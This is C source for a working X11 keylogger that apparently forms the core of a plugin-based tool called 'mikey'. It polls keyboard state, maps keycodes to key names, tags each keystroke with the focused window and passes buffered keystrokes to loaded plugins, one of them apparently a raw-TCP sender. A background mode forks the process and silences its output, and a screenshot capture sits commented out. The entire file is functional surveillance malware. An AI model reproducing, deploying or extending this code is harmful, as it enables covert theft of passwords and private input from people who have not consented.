#include <X11/Xlib.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include "../include/buffer.h"

#define SIZE 1024
#define SLEEP 50000
#define INTERVALOFINACTIVITY 5

int background = 0;
const char *plugins[] = {"mikey-rawtcp.so", "mikey-plaintext.so"};

void handleArgs(void **hdlarr, int argc, char* argv[]) {

    int i;

    moduleHandleArgs(hdlarr, argc, argv);

    for (i = 1; i < argc; i++) {
        if ((strcmp(argv[i], "-b") == 0) || (strcmp(argv[i], "--background") == 0)) {
            background = 1;
        }
    }
}

void moduleHandleArgs(void **hdlarr, int arc, char* argv[]) {

    typedef void (*initf)();
    initf func;
    char *result;
    int i; 
    for (i = 0; i < (sizeof(plugins) / sizeof(plugins[0])); i++) {
        func = dlsym(hdlarr[i], "handleArgs");
        result = dlerror();
        if (result) {
            printf("%s", result);
        }

        func(arc, argv);
    }

}

void *initPlugins(void **hdlarr) {
     
    int i;
    for (i = 0; i < (sizeof(plugins) / sizeof(plugins[0])); i++) {
        hdlarr[i] =  dlopen (plugins[i], RTLD_NOW);
        if (!hdlarr[i]) {
            printf("%s", dlerror());
            exit(1);
        }
    }
}

void moduleFeed(void **hdlarr, char *b) {

    typedef void (*initf)();
    initf func;
    char *result;
    int i;
    for (i = 0; i < (sizeof(plugins) / sizeof(plugins[0])); i++) {
        func = dlsym(hdlarr[i], "getFeed");
        result = dlerror();
        if (result) {
            printf("%s", result);
        }

        func(b);
    }

}

void addParentheses(char **res) {
    char *tmp = *res;
    *res = (char*)malloc(snprintf(NULL, 0, " (%s) ", tmp) + 1);
    sprintf(*res, " (%s) ", tmp);
}

void keylogger(void **hdlarr) {
    
    BUFFER *b;
    b = initBuffer();
    Display *display;

    char keyboardState[32];
    char keyboardStateOld[32] = {0};

    char bit, bitOld;
    int  iCheck;

    char keyboardStatesym, *keyboardStateString;
 
    time_t timeout = 0;

    int keyCode;
    int needToFree = 0;

    Window focusWin = NULL, oldfocusWin = NULL;
    int iReverToReturn = NULL;

    display = XOpenDisplay(NULL);

    if (display == NULL) {
        printf("Error: XOpenDisplay");
    }

    int logging = 0;

    while(1) { 

        usleep(SLEEP);

        if ((logging == 1) && (time(NULL) > timeout)) {
            logging = 0;
            moduleFeed(hdlarr, b->buffer);
            emptyData(b);
        }
            
        XQueryKeymap(display, keyboardState);
        
        if (memcmp(keyboardState, keyboardStateOld, 32) != NULL) {
            
            /*
            XImage* pic;
            pic = XGetImage(display, RootWindow(display, DefaultScreen(display)), 10, 10, 201, 201, AllPlanes, ZPixmap);   
            */

            int i = 0, j = 0;

            for(i = 0; i < sizeof( keyboardState ); i++) {
                bit = keyboardState[i];
                bitOld = keyboardStateOld[i];
                iCheck = 1;

                for ( j = 0 ; j < 8 ; j++ ) {
                    if ((bit & iCheck) && !(bitOld & iCheck)) {
                        keyCode = i * 8 + j;

                        keyboardStatesym = XkbKeycodeToKeysym(display, keyCode, 0, 0);
                        keyboardStateString = XKeysymToString(keyboardStatesym);

                        if (keyboardStateString == NULL) { 
                            switch (keyCode) {
                                case 22:
                                    keyboardStateString = "backspace";
                                    break;
                                case 36:
                                    keyboardStateString = "enter";
                                    break;
                                default:
                                    keyboardStateString = "unknown";
                            }
                        }

                        if (strlen(keyboardStateString) > 1) {
                            addParentheses(&keyboardStateString);
                            needToFree = 1;
                        }

                         // Get current active window
                        oldfocusWin = focusWin;
                        XGetInputFocus(display, &focusWin, &iReverToReturn);

                        if (!background) {
                            printf("WindowID %x Key: %s Code: %i\n", focusWin, keyboardStateString, keyCode);
                        }

                        if (focusWin != oldfocusWin) {
                            moduleFeed(hdlarr, b->buffer);
                            emptyData(b);
                        }


                        addData(b, keyboardStateString);
                        //printf("Contents of buffer: %s", b->buffer);

                        timeout = time(NULL) + INTERVALOFINACTIVITY;
                        logging = 1;

                        if (needToFree) {
                            free(keyboardStateString);
                            needToFree = 0;
                        }

                    }
                    iCheck = iCheck << 1 ;
                }
            }
        }
        memcpy(keyboardStateOld, keyboardState, 32);
    }
    XCloseDisplay(display);
}

void createProccess(void **hdlarr) {
    pid_t pid;
    pid = fork();

    // If main, fork.
    if (pid > 0) {
        printf("Main: Creating proccess (PID: %i)\n", pid);
        return;
    }

    // If error...
    if (pid == -1) {
        printf("Error while trying to fork!");
        return;
    }

    // If proccess, run keylogger.
    if (pid == 0) {
        keylogger(hdlarr);
    }
}

int main(int argc, char *argv[]) {  

    void *hdlarr[100];
    initPlugins(hdlarr);
    
    handleArgs(hdlarr, argc, argv);

    if (background) {
        createProccess(hdlarr);
    }
    else {
        keylogger(hdlarr);
    }
}
